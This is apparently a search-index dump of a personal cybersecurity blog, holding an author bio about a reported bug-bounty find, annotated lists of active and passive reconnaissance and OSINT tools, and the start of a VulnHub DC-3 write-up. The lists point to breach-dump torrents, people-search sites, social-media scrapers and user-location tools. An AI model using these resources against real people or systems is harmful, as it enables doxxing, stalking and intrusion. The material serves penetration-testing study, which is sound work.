[{"categories":null,"content":"whoami","date":"11-17-2023","objectID":"/whoami/","tags":null,"title":"","uri":"/whoami/"},{"categories":null,"content":"Hello world! whoami I‚Äôm a born computer nerd who‚Äôs trying to figure out how everything works. My path to cyber is fun and frustrating at the same time, so here‚Äôs a quick story‚Ä¶ One day, I decided I wanted more out of my IT career and asked a cyber buddy where I should begin. He suggested that I apply myself in a home-built lab and obtain my Security+ certification, so I did just that. I started by purchasing a Security+ course on a major online learning platform and began studying. As I watched the Security+ course, I glanced at the page source to find the current video‚Äôs MP4 file exposed. I then force-browsed my way to the Security+ course‚Äôs root video directory, giving me access to all the Security+ course‚Äôs MP4 files‚Ä¶ Big deal, right? I had paid for access. Well, after confirming this learning platform was part of a bug bounty program and that this discovery was in-scope, I wandered my way to a random unpaid-for course and found the directory structure by force-browsing from the course‚Äôs sample video URL. This ultimately led to the discovery of all the MP4 videos of the unpaid-for course! Did my intuition lead me to my first bug!? With the lack of experience I had, I was having a hard time believing the situation, so I confirmed the issue by looking over a few other courses, verifying the problem over and over. Despite my lack of experience with bug reporting, the report I submitted was effective. After a few days passed, I revisited the learning platform and verified that the issue had been fixed, while later receiving a reply on the bug bounty platform stating that no issues were found. Even though I was upset for not getting the recognition, I came out on top by learning two important things that day: I found my passion in cybersecurity, stemming from the idea of helping others protect their data. Making clear, concise, and detailed reports is very important! Anyways, why this blog? Provide a resource for others. üòÉ Showcase my knowledge to employers. üòâ Now, go dig around! ","date":"11-17-2023","objectID":"/whoami/:0:0","tags":null,"title":"","uri":"/whoami/"},{"categories":["Resources \u0026 Tools"],"content":" Active Reconnaissance To gather intelligence by actively engaging the target. In the active reconnaissance phase, we‚Äôre planning our future phases, like exploitation, by actively collecting information on the target by enumeration, scanning, etc. Few examples: What targets were found and what ports are open? What software, versions, and configs are we up against? Any sensitive data or services found through fuzzing or crawling? Any hosts/services vulnerable to known exploits? Enumerate users, groups, GPOs, policies, etc All while we continue to map the possible network topology. This is a list of tools which use active reconnaissance techniques(E.g., Scanning, Fingerprinting, Enumeration, etc) to gather information on the target. Exploit Warning! Many Active Reconnaissance tools are capable of Executing Exploits! Regarding my notes: The brackets ( ) after each tool will indicate if the tool is: (built-in) = Within Kali‚Äôs repo. If not already installed, run the following: sudo apt update \u0026\u0026 sudo apt install *tool-to-install* (external) = Outside Kali‚Äôs repo. It‚Äôll need downloaded then installed. (website) = Part of a website. There‚Äôs others but they‚Äôre self-explanatory. I‚Äôll also try specifying any restrictions I know of. API access needed. Paywalls. etc. ","date":"11-03-2023","objectID":"/active-recon/:0:0","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Darkweb OnionScan - (external) ‚ÄúOnionScan is a free and open source tool for investigating the Dark Web.‚Äù Scan details at ‚ÄúWhat is scanned for‚Äù. ","date":"11-03-2023","objectID":"/active-recon/:0:1","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Domains Probe automation httprobe (external) ‚ÄúTake a list of domains and probe for working http and https servers.‚Äù Great for automating subdomain discovery prior to gowitness. Subdomains Amass by OWASP (built-in) Open-source for enumerating and discovering subdomains. Active scanning, option -active, will attempt to gather TLS certificates, perform web crawling, DNS zone transfer, and NSEC(zone) walking. ","date":"11-03-2023","objectID":"/active-recon/:0:2","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Fuzzing AIO Fuzzing ffuf (built-in) Fuzzer written in Go. Finds directory, files, V-Host, and GET and POST parameter fuzzing, etc. GoBuster (built-in) Fuzzing tool written in Go. Used for Directory/File, DNS, V-Host, open S3 and cloud buckets, and TFTP servers. Wfuzz (built-in) Anything web application fuzzer. E.g., RCE, VHost, etc. Replaces FUZZ reference with specified payload. Web Path Fuzzing DirBuster (built-in) Multithread GUI/CLI Java app for fuzzing webapp files and directories. dirsearch (built-in) An advanced web path brute-forcer for fuzzing directories and files. FeroxBuster (built-in) ‚ÄúForced Browsing‚Äù rust tool used for enumerating directories and files. Web Object Fuzzing DIRB (built-in) Web-Object fuzzer. ","date":"11-03-2023","objectID":"/active-recon/:0:3","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Scanners Network Scanners Nmap (built-in) The ‚Äúgoto‚Äù network and port scanner with many capabilities beyond scanning, e.g., built-in scripts for vulnerability testing, etc. CMS Scanners CMSmap (external) CMSmap is a python open source CMS scanner that automates the process of detecting security flaws of the most popular CMSs. WPScan (built-in) WPScan WordPress security scanner. Written for security professionals and blog maintainers to test the security of their WordPress websites. joomscan by OWASP (built-in) OWASP Joomla Vulnerability Scanner Project. Web Scanners Nessus (external) - Account creation required. Free for home use but limited to 15 hosts. Proprietary vulnerability scanner by Tenable. Has many additional scanning options like specialized scans, web app scans, etc. nikto (built-in) Web server vulnerability scanner in perl. OpenVAS (built-in) - Account creation required. Commercial and CE editions Component of the Greenbone Vulnerability Management suite. Sn1per (external) - Exploitation features tied to premium. API integration available! Open source recon and penetration testing framework. Premium and CE versions available. SNMP Scanners onesixtyone (built-in) SNMP scanner which logs the software running on a device. Specialized Scanners log4j-scan (external) A fully automated, accurate, and extensive scanner for finding log4j RCE CVE-2021-44228. Supports lists of URLs, 60+ HTTP headers, Bypass payloads for WAFs(Web Application Firewall), etc. ItWasAllADream (external) CVE-2021-34527 (PrintNightmare) RCE python scanner. Scan entire subnets for PrintNightmare RCE(Remote code execution) and export CVS report. Does NOT apply to LPE(Local privilege escalation)! Only RCE! ","date":"11-03-2023","objectID":"/active-recon/:0:4","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Web * Web App Firewall WAFW00F (built-in) Identify and fingerprint Web Application Firewall (WAF) products protecting a website. Web App Proxy BurpSuite (built-in) - Free version has rate limited brute-forcing. Paid version has many features. AIO web app security testing. Free community extensions can help improve the free version. Zed Attack Proxy (ZAP) (built-in) Free and open-source web app scanner. No limit on brute-force attempts. Foxy Proxy (browser extension) Browser proxy used with ZAP and Burp. Web TechStack Wappalyzer - (Browser Extension) Actively interacts with a website, when browsing to it, to find website‚Äôs tech stack in realtime. WhatWeb (built-in) Default scan uses HTTP requests to identify website‚Äôs tech stack. Aggression is adjustable. Website Screenshots gowitness (external) - Requires chromium to be installed. ‚Äúgowitness - a golang, web screenshot utility using Chrome Headless.‚Äù Great for automating external pentests by removing the manual process of visiting each found website. ","date":"11-03-2023","objectID":"/active-recon/:0:5","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Wireless aircrack-ng - (built-in) AIO wireless security suite. Contains both passive and active recon tools, along with many exploitation tools. ","date":"11-03-2023","objectID":"/active-recon/:0:6","tags":["Active Reconnaissance","Scanning","Fingerprinting","Tools","Resources","Enumeration"],"title":"Active Recon Resources","uri":"/active-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Passive Reconnaissance To gather intelligence without actively engaging the target. In the passive recon phase, we‚Äôre planning our future steps by passively collecting information on the target by fingerprinting, using OSINT, etc. Few examples: Any email formats found? What names can we find related to the target? Sensitive data found on social media? Badges, passwords, or software icons in pics? Any exposed credentials in dumps? Repeat password patterns? What‚Äôs the business structure. Who holds the keys? Any sensitive information in open website/domain records? All while we continue to map the possible network topology. This is a list of tools which use passive reconnaissance techniques(E.g., OSINT, etc) to gather information on the target. Warning! Some Passive Reconnaissance tools may Actively Engage the Target. Regarding my notes: The brackets ( ) after each tool will indicate if the tool is: (built-in) = Within Kali‚Äôs repo. If not already installed, run the following: sudo apt update \u0026\u0026 sudo apt install *tool-to-install* (external) = Outside Kali‚Äôs repo. It‚Äôll need downloaded then installed. (website) = Part of a website. There‚Äôs others but they‚Äôre self-explanatory. I‚Äôll also try specifying any restrictions I know of. API access needed. Paywalls. etc. ","date":"10-28-2023","objectID":"/passive-recon/:1:0","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"AIO Tools Aware Online - (website) Resources, tutorials, etc. Company based in Netherlands. awesome osint - (website) Awesome OSINT is a large collection of resources dedicated to anything OSINT. Hunchly - (chrome extension) - Trial available Chrome extension for organizing your findings and exporting them. It can auto screenshot as you go. IntelTechniques - (website) Great resource for OSINT anything. Tools included. _IntelligenceX - (website) - Free account required. Tools which can be used for many different OSINT purposes. Email format validation, DNS records, etc Maltego CE - (built-in) - APIs aren‚Äôt needed but can help widen your net. Great link analysis tool for the aggregated data it collects. Helps visualize paths of data points, etc. Maltego Essentials Youtube Playlist - Youtube playlist for learning Maltego. OSINT Combine - (website) AIO site that hosts many useful online tools. E.g., Darkweb, socials, usernames, etc OSINT Framework - (website) Fun interactive site that can help you see the paths of OSINT but, honestly, I‚Äôve never use it. Pentest-Tools.com - (website) - Limited without subscription. Many limited use tools. Access by clicking hamburger menu then Tools. recon-ng - (built-in) ‚ÄúOpen Source Intelligence gathering tool aimed at reducing the time spent harvesting information from open sources.‚Äù Great framework for OSINT gathering. It has a similar feeling to metasploit since it uses modules, ‚Äúrun‚Äù, etc ","date":"10-28-2023","objectID":"/passive-recon/:1:1","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"AIO VM Trace Labs Organization - (external - VM VMware \u0026 VirtualBox) ‚ÄúTrace Labs is a nonprofit organization whose mission is to accelerate the family reunification of missing persons while training members in the tradecraft of open source intelligence (OSINT).‚Äù This VM was created for OSINT. Updated regularly. Privacy focused. Trace Labs Github. Latest Trace Labs OSINT VM. ","date":"10-28-2023","objectID":"/passive-recon/:1:2","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Accounts(Usernames) CheckUserNames - (website) Website that helps find where a username may be in use, or not in use. GHunt - (external \u0026 website) CLI script, and online now, which can help you dig into anything Google, including accounts. iDCrawl - (website) Search for usernames across different online platforms. Maigret - (external) Fork of Sherlock that creates a dossier of a person by username. NameChecker - (website) Search for usernames across different online platforms. NameCheckUp - (website) Search for usernames across different online platforms. Sherlock - (built-in) ‚ÄúHunt down social media accounts by username across social networks‚Äù Tool built-in to Kali which allows you to search many different social networks for a username. Sherlock‚Äôs Github Pages website WhatsMyName Web - (website) A very thorough tool that searches the web for usernames and names. ","date":"10-28-2023","objectID":"/passive-recon/:1:3","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Breaches/Dumps Dumps 1.4B Breach Compilation - (Torrent Link) Rockyou2021.txt - Collection of wordlists combined - (Torrent Link) psbdmp.ws (website) - API available. Biggest archive(database) of paste dumps. Search Breaches/Dumps search.0t.rocks (website) 14B records to sift through. Older DB. DEHASHED (external website \u0026 API) - No account required but limited. API available through subscription. Search dumps and chain emails, hashes, and passwords while looking for reuse across different accounts. Breach Parse - (external) A tool for parsing breached passwords. Works well with 1.4B Breach Compilation. haveibeenpwned(HIBP) (external website \u0026 API) - API available through subscription. The website allows you to search through a large updated database of data dumps for either emails or passwords. It‚Äôs active and updated regularly. API subscription available. You send API the first 5 characters of a hash and API responses with a list of hashes matching the sent prefix. Facebook Data Breach Checker - (website) Searches through 533 million Facebook accounts for dumped phone number. Uses k-anonymity to ensure privacy. LeakCheck - (website) - Account required. Alternative to HIBP and dehashed. SnusBase - (website) - Account required. Indexes information from websites which had data breaches. ","date":"10-28-2023","objectID":"/passive-recon/:1:4","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Bucket search engines S3 bucket search GrayHatWarfare (website) - Free = limited range. Registered = double free range. Premium = unlimited w/ full path search. S3 bucket search engine. ","date":"10-28-2023","objectID":"/passive-recon/:1:5","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Businesses AIHIT - (website) - Account creation and/or subscription may be needed. Company database aggregator. BBB - (website) Local business search. Find phone numbers, addresses, names, and reviews/complaints. Bloomberg - (website) - Account creation and/or subscription may be needed. Find history and news on a company, including public finances. OpenCorporates - (website) Largest legal-entity database holding copyleft Open Database License. LinkedIn - (website) Great place to find badge photos, employee lists, tech stack through job applications, etc. Companies may not share sensitive information but employees do. üòÑ NerdyData - (website) Get a list of websites that use certain technologies, plus the company‚Äôs tech spend data. ","date":"10-28-2023","objectID":"/passive-recon/:1:6","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Code Search grep.app - (website) Search across a half million git repos. Great place to dig for leaked secrets, etc. RepoSearch - (website) Search for source code across SVN and Github repos. PublicWWW - (website) Search through a web page‚Äôs HTML, JS, and CSS code. Updated regularly. SearchCode - (website) Searches Bitbucket, CodePlex, Fedora Project, Gitlab, Github, Gitorious, Google Android source codes. ","date":"10-28-2023","objectID":"/passive-recon/:1:7","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Darkweb Search Engines BizNar - (website) Deep Web search engine. real-world-onion-sites - (website) ‚ÄúThis is a list of substantial, commercial-or-social-good mainstream websites which provide onion services.‚Äù ","date":"10-28-2023","objectID":"/passive-recon/:1:8","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Domains Domain AIO assetfinder - (built-in) Domain and subdomain discovery using passive methods written in golang. CentralOps.net - (website) Domain \u0026 network WHOIS, DNS records, service scan, traceroute, etc. ViewDNS.info - (website) Collection of domain level tools. DNS \u0026 Records DNS Dumpster - (website) DNS \u0026 Whois recon and research. dnsenum (built-in) Multithreaded perl script that enumerates DNS information and non-contiguous IP blocks. DNSRecon (built-in) Very flexible and effective DNS scanning and enumeration tool. Ability to use external passive means along with local wordlist fuzzing techniques for discovery. Fierce (built-in) A DNS reconnaissance tool for locating non-contiguous IP space. Subdomains Amass by OWASP - (built-in) Open-source CLI for enumerating and discovering subdomains. Defaults to passive recon but active is an option. CRT.sh - (website) Search digital certificates of subdomains. Great subdomain tool! DNSlytics - (website) Find domains sharing the same IP or subnet. SpyonWeb.com - (website) Similar to DNSlytics above. Subfinder - (built-in)- Many API options but not required. Passive subdomain enumeration using golang. Works really well even without APIs. Sublist3r - (built-in) Python tool for enumerating subdomains via OSINT. Older but still useful in some situations. Was it a Tor Relay Exonerator(Tor Project) - (website) Search IP and/or date to find out if IP was used as Tor relay. ","date":"10-28-2023","objectID":"/passive-recon/:1:9","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Emails ClearBit (Chrome Extension) - Account required. Confirm and cross reference emails found. DEHASHED (external website \u0026 API) - No account required but limited. API requires subscription. Chain emails, hashes, passwords and look for reuse across different accounts. Email Hippo (website) - No account required. Verify if an email is real or fake. h8mail (external) - May require access to various APIs Email OSINT \u0026 Password breach hunting tool, locally or using premium services. Supports chasing down related email. Digs through local databases or remote databases for findings. API restrictions. hunter.io (built-in and website) - Free is limited. Email address search engine/parser. phonebook.cz (website) - _Intelx account required(free). Email address search engine, plus more. Zen (external) - Supports HIBP API. Find emails of Github users. ","date":"10-28-2023","objectID":"/passive-recon/:1:10","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"File Search Engines Any File Type Search dedigger - (website) Find public files in Google drives. File Pursuit - (website) ‚ÄúSearch the web for files, videos, audios, eBooks \u0026 much more.‚Äù FileSearch - (website) Search archives, programs, videos, music, books, and more. DLL Dump - (website) - Careful downloading DLLs. Malicious warning! Free collection of DLL files free for download. Document \u0026 Slide Search BASE - (website) ‚ÄúBASE is one of the world‚Äôs most voluminous search engines especially for academic web resources.‚Äù CORE - (website) Searches world‚Äôs largest collection of open access research papers. FreeFullPDF - (website) ‚ÄúFind free scientific publications in PDF format‚Äù Google Scholar - (website) Google search for anything scholar. Video Search deturl - (website) Download any youtube video by adding ‚Äúpwn‚Äù to beginning of youtube video‚Ä¶ pwnyoutube.com/watch?v=********* filmot - (website) Search within Youtube Subtitles. Youtube DataViewer - (website) Quickly extract Youtube video data by providing link. ","date":"10-28-2023","objectID":"/passive-recon/:1:11","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Forums Search boardreader - (website) Searches various forums, blogs, reviews and news via APIs. builtwithFlarum - (website) Discover Flarum made discussion boards. ","date":"10-28-2023","objectID":"/passive-recon/:1:12","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"GeoLocation Search GeoLoc GeoCreepy - (external) Creepy Github A geolocation OSINT tool. Offers geolocation information gathering through social networking platforms. Google Earth - (website) Google Earth. Find locations based on GPS coordinates, etc. Youtube GeoFind - (website) Find GeoLocation information on Youtube channels, etc GeoLoc Practice GeoGuessr - (Website \u0026 phone app) Game for everyone. Gamified OSINT through google maps. ","date":"10-28-2023","objectID":"/passive-recon/:1:13","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Images Exif Data ExifTool - (built-in) CLI app for reading and writing exif, GPS, IPTC, XMP, and other meta info in image, audio, PDF, and video. libexif - (external) Library written in portable C. Read and writes exif metadata in image files. Reverse Image Search Foto Forensics - (website) Provides access to cutting-edge tools for digital photo forensics. Service was retired but then recreated, by ‚ÄòHacker Factor‚Äô with the goal of providing ‚Äú‚Ä¶a free service that provides an introduction to photo forensics.‚Äù Foto Forensics tutorial. Google Lens - (website) AI driver reverse image search. Click the little colored camera to open upload feature. Upload image or input image URL. PimEyes - (website) - Subscription may be needed. Try page source for found image URL? Reverse image search. For better results turn off safe search but results may become NSFW! TinyEye - (website) Image search and recognition company with reverse image search. Stock Images FreeImages - (website) Free stock images. Free Stocks - (website) Free stock images. pixabay - (website) Free stock images. unsplash - (website) Free hi-res images. Unique. ","date":"10-28-2023","objectID":"/passive-recon/:1:14","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"IoT/Device Search censys - (website) - Free account required for personal use. censys.com How-To Guide Netlas - (website) Intel apps that provide IP address, domains, websites, web Apps, IoT, and other assets. Shodan.io - (website) - Free account required. Lifetime subscriptions on sale at random. Shodan How-To Guide Search IP to do service scans. city:city - will show devices in city area. port:port - will search for port only. org:organization - will search org specified. ","date":"10-28-2023","objectID":"/passive-recon/:1:15","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Leaks Offshore Leaks Database - (website) Search leak databases ","date":"10-28-2023","objectID":"/passive-recon/:1:16","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Online Cameras Insecam - (website) Live camera directory. Uses Shodan to find cameras then indexes them. ","date":"10-28-2023","objectID":"/passive-recon/:1:17","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Organizations Trace Labs Organization - (website - VM VMware \u0026 VirtualBox) ‚ÄúTrace Labs is a nonprofit organization whose mission is to accelerate the family reunification of missing persons while training members in the tradecraft of open source intelligence (OSINT).‚Äù This VM was created for OSINT. Updated regularly. Privacy focused. International Consortium of Investigative Journalists - (website) Source for investigations, news, and host of publicly made leaks. They also take in leaked data. Innocent Lives Foundation - (website) ‚ÄúIdentify anonymous child predators and help bring them to justice. ","date":"10-28-2023","objectID":"/passive-recon/:1:18","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Persons Federal Bureau of Prisons - (website) Searches prisons for inmates by number or name. Fast Background Check - (website) Searches public records for personal information. It‚Äôs quick too. Fast People Search - (website) Can find relatives, phone, address, etc. Decent at finding active phone numbers. iDCrawl - (website) Person search engine. Photos, socials, usernames, address, etc. Jury Records - (website) Searches jury cases for linked persons. peekyou - (website) Uses other site searches to find person information. TruePeopleSearch - (website) Finds address(with google maps), phone, relatives, associates, etc. Webmii - (website) Person search but includes some social platforms too. White Pages - (website) One of the largest person contact and background databases. ","date":"10-28-2023","objectID":"/passive-recon/:1:19","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Phone Numbers CallerID Test - (website) - 5 searches a day. Free phone number search. Locates city, state, and phone provider. infobel - (website) Phone search across North America, South America, Europe, Asia, Africa, Australia and the Pacific, and the Middle East. USA version called us-info true caller - (website \u0026 phone app) - Registration required. Searches phones numbers. Many cellular phones have this integrated for caller ID. ","date":"10-28-2023","objectID":"/passive-recon/:1:20","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Social Platforms Facebook Facebook Friend List Scraper - (external) ‚ÄúOSINT tool to scrape names and usernames from large friend lists on Facebook, without being rate limited.‚Äù fb-sleep-stats - (external) ‚ÄúUse Facebook to track your friends‚Äô sleeping habits‚Äù Facebook ID Lookup - (website) ‚ÄúFacebook ID finder can help you find your or someone‚Äôs Facebook numeric user ID easily‚Äù Instagram Tools By CodeOfaNinja - (website) Various tools, including social ID finders. HashTagify - (website) Search instagram hashtags. Osintgram - (external) ‚ÄúOsintgram is a OSINT tool on Instagram. It offers an interactive shell to perform analysis on Instagram account of any users by its nickname‚Äù. sterraxcyl - (external) ‚ÄúInstagram OSINT tool to export and analyze followers | following with their details‚Äù. Toutatis - (external) ‚ÄúToutatis is a tool that allows you to extract information from instagram accounts such as e-mails, phone numbers and more‚Äù. LinkedIn InSpy - (external) Python based LinkedIn enumeration tool requiring¬†Hunter.io¬†API key. Pinterest Aware-Online Pinterest OSINT Guide - (website) Reddit Subreddits - (website) Discover new subreddits. Reddit Comment Search - (website) Find all comments posted by user. Snapchat Snapchat Map - (website) Built-in search engine for snapchat, including map. Telegram Telegram Nearby Map - (external) Discover the location of nearby Telegram users. Tumblr Tumblr 2013 data breach search - (website) Twitter Nitter - (external \u0026 website) Free and open source front-end for searching twitter(x) without an account. Nitter Github foller.me - (website) ‚ÄúTwitter analytics shows followers, hashtags, topics, mentions, and other statistics for any public Twitter profile.‚Äù ","date":"10-28-2023","objectID":"/passive-recon/:1:21","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Threat Intel AlienVault - (website) Open Threat Exchange neighborhood watch of the threat intel community. Rescure - (website) Feeds of malicious IPs, domains, and Malware hashes updated every 24hrs. ","date":"10-28-2023","objectID":"/passive-recon/:1:22","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Voter Records Voter Records - (website) Political research tool which searches public records released by US states. ","date":"10-28-2023","objectID":"/passive-recon/:1:23","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Web Web History Archive.org - (website) OG Wayback Machine by Internet Archive. Archive.is - (website) Archive tool which time capsules web pages. Visual Ping - (website) Visually look at a webpages for changes. Stored.Website - (website) Pulls web cache from selected source. waybackpack - (external) ‚ÄúDownload the entire Wayback Machine archive for a given URL.‚Äù waybackpy - (external) API to interface with wayback machine APIs. Web Search Engines Google Google Hacking for Penetration Testers - (PDF) BlackHat presentation covering ‚ÄúGoogle Hacking for Penetration Testers‚Äù. Google Advanced Search - (website) Helps you run Google operators aka dorks. Dork-Search.com - (website) Google search techniques built into the search bar. Google-Dorking - (website) Site of Google search techniques and tools. Google Guide - (website) Small PDF guide to google search techniques \u0026 operators. Google Hacking Database - (website) Google dorks created by offsec minded individuals. Google Trends - (website) ‚ÄúGoogle Trends is a website by Google that analyzes the popularity of top search queries in Google Search across various regions and languages. The website uses graphs to compare the search volume of different queries over time.‚Äù per Wikipedia. Other Search Engines Aol - (website) Aol search engine. Ask - (website) Ask search engine. Baidu - (website) China‚Äôs google‚Ä¶ Bing - (website) Microsoft search engine. Bing search guide. Advanced Bing search keywords. DuckDuckGo - (website) Privacy focused search engine. DuckDuckGo search guide. Wolfram Alpha - (website) Computational knowledge engine. Yahoo - (website) Yahoo search engine. Yahoo search guide. Yandex - (website) Russia‚Äôs google‚Ä¶ Web Techstack BuiltWith - (website) Search a websites techstack. netcraft - (website) Find infrastructure and techstack. ","date":"10-28-2023","objectID":"/passive-recon/:1:24","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Wireless aircrack-ng - (built-in) AIO wireless security suite. Contains both passive and active recon tools, along with many exploitation tools. WiGLE - (website) Wireless Geographic Logging Engine. Searchable central database of world-wide wireless networks. ","date":"10-28-2023","objectID":"/passive-recon/:1:25","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Wordlists Wordlist Creation ceWL (Custom Word List Generator) - (built-in) Ruby based app which crawls URL returns a list of words. CUPP (Custom User Passwords Profiler) - (built-in) After OSINT, takes user input and creates a custom wordlist based off user input like birthday, name, etc. Mentalist - (external) Wordlist and rules creation tool. namemash.py - (external) Takes first and last name as user input and spits out possible combinations. Useful for after finding names via OSINT. Wordlist Downloads Bruteforce-database repo - (external) Various wordlists in one repo. InfoSecWarrior repo - (external) Various wordlists buried inside the repos. SecLists repo - (built-in) Updated collection of wordlists. Located under /usr/share/wordlists/SecLists ","date":"10-28-2023","objectID":"/passive-recon/:1:26","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["Resources \u0026 Tools"],"content":"Additional OSINT Certifications McAfee Institute - (website) More info @ CISA‚Äôs webpage. ‚ÄúThe Certified in Open Source Intelligence (C|OSINT) program is the first and only globally recognized and accredited board certification on open source intelligence.‚Äù ","date":"10-28-2023","objectID":"/passive-recon/:1:27","tags":["Passive Reconnaissance","OSINT","Tools","Resources","Fingerprinting","Enumeration"],"title":"Passive Recon Resources","uri":"/passive-recon/"},{"categories":["VulnHub"],"content":"DC-3 from the DC-Series(VulnHub).","date":"02-07-2023","objectID":"/dc-3/","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"I enjoyed DC-2‚Äôs Tom \u0026 Jerry theme! It showed us the concept of credential reuse and weak passwords, along with the misconfigurations of wordpress and SUID set binary. Anyways, now onto DC-3.2 aka DC-3! ","date":"02-07-2023","objectID":"/dc-3/:0:0","tags":["CTF (self-hosted)"],"title":"DC-3 of the DC Series","uri":"/dc-3/"},{"categories":["VulnHub"],"content":"DC-3 Details Dropdown to see DC-3's quick overview DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all. Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools. For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won‚Äôt give you the answer, instead, I‚Äôll give you an idea about how to move forward. For those with experience doing CTF and Boot2Root challenges, this probably won‚Äôt take you long at all (in fact, it could take you less than 20 minutes easily). If that‚Äôs the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag. Details can be found at 